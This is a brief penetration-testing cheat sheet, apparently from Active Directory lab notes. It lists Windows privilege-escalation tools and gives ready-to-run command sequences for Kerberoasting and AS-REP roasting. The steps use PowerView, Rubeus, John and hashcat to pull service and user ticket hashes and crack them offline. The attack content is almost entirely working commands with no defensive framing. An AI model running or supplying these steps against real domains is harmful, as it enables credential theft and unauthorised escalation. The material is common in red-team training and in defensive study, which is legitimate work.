# Privilege Escalation

## Local

Escalate privilege on local system to gain Admin rights

- PowerUp : https github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- BeRoot : https:// github.com/AlessandroZ/BeRoot
- Privesc : https:// github.com/enjoiz/Privesc

  ### PowerUp

  ```
  Invoke-AllChecks
  ```
## Domain

### Kerberosting

Execute Kerberosting Attack.

```
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -SPN
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\test\hashes.txt
john.exe --wordlist=C:\AD\test\10k-worst-pass.txt C:\AD\test\hashes.txt
```

### ASREP-Roasting

Execute ASREP Roasting.

```
Get-DomainUser -PreauthNotRequired -Verbose
Rubeus.exe asreproast /format:hashcat /user:user01 /outfile:hash.txt
hashcat.exe -a 0 -m 18200 hash.txt 500-worst-passwords.txt 
```
